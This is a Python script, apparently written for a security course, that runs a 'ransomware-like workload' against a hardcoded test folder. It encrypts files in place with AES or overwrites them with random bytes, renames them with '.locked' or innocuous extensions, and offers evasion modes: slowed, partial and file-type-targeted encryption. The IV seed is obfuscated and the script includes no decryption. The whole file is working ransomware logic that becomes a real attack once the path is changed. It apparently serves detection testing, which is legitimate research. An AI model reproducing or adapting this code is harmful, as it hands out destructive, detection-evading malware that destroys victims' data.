import argparse
import getpass
import hashlib
import os
import random
import time

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BENIGN_EXTENSIONS = [".bak", ".tmp"]
TARGETED_EXTENSIONS = {".docx", ".pdf", ".xlsx"}
SUSPICIOUS_EXT = ".locked"

encrypted_count = 0


def _derive_key_iv(user_key):
    key = hashlib.sha256(user_key.encode()).digest()
    hidden = bytes([0x18, 0x0F, 0x0C, 0x18, 0x1F, 0x14])
    iv_word = bytes(b ^ 0x52 for b in hidden).decode()
    iv = hashlib.sha256(iv_word.encode()).digest()[:16]
    return key, iv


def encrypt_data(data, user_key):
    key, iv = _derive_key_iv(user_key)
    return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data, AES.block_size))


def process_file(full_path, user_key, scenario, benign_ext=".bak", delay=0.002):
    global encrypted_count

    try:
        lower = full_path.lower()
        if lower.endswith(SUSPICIOUS_EXT) or any(lower.endswith(ext) for ext in BENIGN_EXTENSIONS):
            return

        with open(full_path, "rb") as f:
            data = f.read()

        new_content = os.urandom(max(len(data), 1024)) if scenario == "random_bytes" else encrypt_data(data, user_key)
        with open(full_path, "wb") as f:
            f.write(new_content)

        if scenario in {"baseline", "random_bytes", "reduced_speed", "partial_encryption", "targeted_filetypes"}:
            os.rename(full_path, full_path + SUSPICIOUS_EXT)
        elif scenario == "benign_extension":
            os.rename(full_path, full_path + benign_ext)

        encrypted_count += 1
        print(f"[{scenario.upper()}] {full_path} | total={encrypted_count}")
        time.sleep(delay)

    except Exception as exc:
        print(f"[ERROR] {full_path}: {exc}")


def collect_files(root, scenario, partial_pct=100):
    files = []
    for dirpath, _, filenames in os.walk(root):
        for name in filenames:
            lower = name.lower()
            if name.startswith("~$") or lower.endswith((".exe", SUSPICIOUS_EXT, *BENIGN_EXTENSIONS)):
                continue
            files.append(os.path.join(dirpath, name))

    if scenario == "targeted_filetypes":
        files = [p for p in files if os.path.splitext(p)[1].lower() in TARGETED_EXTENSIONS]

    if scenario == "partial_encryption" and partial_pct < 100:
        files = random.sample(files, max(1, int(len(files) * partial_pct / 100)))

    return files


def parse_args():
    p = argparse.ArgumentParser(description="Run a ransomware-like workload.")
    p.add_argument(
        "--scenario",
        choices=[
            "baseline",
            "no_extension",
            "benign_extension",
            "inplace_overwrite",
            "reduced_speed",
            "partial_encryption",
            "targeted_filetypes",
            "random_bytes",
        ],
        default="baseline",
    )
    p.add_argument("--delay", type=float, default=0.002)
    p.add_argument("--benign-ext", choices=BENIGN_EXTENSIONS, default=".bak")
    p.add_argument("--partial-pct", type=int, choices=[10, 25], default=10)
    p.add_argument("--seed", type=int, default=42)
    return p.parse_args()


def main():
    global encrypted_count
    args = parse_args()
    random.seed(args.seed)

    user_key = "" if args.scenario == "random_bytes" else getpass.getpass("Enter encryption key: ")
    test_folder = f"C:/Users/{getpass.getuser()}/Desktop/PSU/Term 8/IST 584/TestFolder"
    files = collect_files(test_folder, args.scenario, args.partial_pct)

    print(f"\n[INFO] Scenario: {args.scenario}")
    print(f"[INFO] Files targeted: {len(files)}\n")

    for path in files:
        process_file(path, user_key, args.scenario, args.benign_ext, args.delay)

    print("\n" + "=" * 50)
    print(f"[SUMMARY] Scenario: {args.scenario}")
    print(f"[SUMMARY] Files processed: {encrypted_count}")
    print("=" * 50)


if __name__ == "__main__":
    main()
